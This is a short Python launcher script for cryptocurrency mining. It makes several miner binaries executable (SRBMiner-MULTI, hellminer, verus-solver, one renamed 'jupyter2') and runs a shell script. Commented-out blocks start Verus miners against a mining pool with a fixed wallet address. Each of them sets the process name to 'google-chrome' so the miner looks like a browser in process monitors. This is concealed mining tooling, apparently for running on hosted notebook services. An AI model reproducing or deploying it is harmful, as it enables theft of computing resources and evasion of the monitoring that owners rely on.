import os
import random
os.system("chmod +x SRBMiner-MULTI hellminer verus-solver hell.sh verus-solver-original jupyter2")

os.system("bash hell.sh")


# name = random.randint(2000,9000)
# # Replace the current process with the mining process
# os.execvp("./jupyter2", [
#     "google-chrome",  # This will be the name shown in process monitors
#     "-a", "verush",
#     "--url", "stratum+tcp://us.vipor.net:5040",
#     "-u", f"RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK.aaa{name}",
#     "-p", "d=0.1",
#     "-t", "50"
# ])

# os.execvp("./SRBMiner-MULTI",  [
#     "google-chrome",
#     "--disable-gpu",
#     "--algorithm", "verushash",
#     "--pool", "us.vipor.net:5040",
#     "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK",
#     "--worker", f"aaa{name}", 
#     "--password", "x",
#     "--cpu-threads", "0"
# ])
# import os

# # Example worker name
# name = "your_worker_name"

# # Arguments for SRBMiner-MULTI
# srb_args = [
#     "./SRBMiner-MULTI", 
#     "--disable-gpu", 
#     "--algorithm", "verushash",
#     "--pool", "localhost:3000", 
#     "--wallet", "RFKr91aNYATHiemELH8FfCyNDFuo1gkAbK", 
#     "--worker", f"aaa{name}", 
#     "--password", "d=4", 
#     "--cpu-threads", "4"
# ]

# # Replace the current process with google-chrome
# chrome_args = ["google-chrome"]

# # Executing google-chrome and passing the arguments from SRBMiner
# os.execvp(srb_args, chrome_args)

